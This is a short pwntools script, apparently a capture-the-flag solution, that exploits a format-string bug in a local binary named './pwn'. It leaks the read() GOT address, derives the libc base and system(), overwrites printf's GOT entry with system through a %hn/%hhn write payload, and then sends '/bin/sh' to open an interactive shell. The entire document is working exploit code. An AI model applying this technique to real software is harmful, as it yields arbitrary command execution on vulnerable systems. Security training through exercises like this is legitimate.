from pwn import *
p=process('./pwn')
gdb.attach(p,'''
	break *0x080485BB
	break *0x080485ca
	continue
''')
elf=ELF('./pwn')
libc=ELF('./libc.so.6')
p.recvuntil('Do you know repeater?\n')
p.sendline(p32(elf.got['read']))
p.sendline('%6$s')
read_address=int((p.recv(12)[5:9][::-1]).encode('hex'),16)
log.info('read_address > '+hex(read_address))
libc_base=read_address-libc.symbols['read']
log.info('libc_base > '+hex(libc_base))
system_address=libc_base+libc.symbols['system']
log.info('system > '+hex(system_address))
payload=p32(elf.got['printf'])+p32(elf.got['printf']+2)
len1=(system_address & 0xffff)
len2=((system_address >> 16) &0xff)
#len3=(system_address>>16)&0xff
#print hex(len2)+' is len2'
payload+='%'+str(len1-8) + 'x%6$hn'
payload+='%'+str(len2) + 'x%7$hhn'
#payload+='%'+str(len3) + 'x%8$hn'
#print payload
#p.sendline('%01x%6$hhn'+'%1x%7$hhn'+'%2x%8$hhn')
p.send(payload)
p.sendline('/bin/sh')
p.interactive()

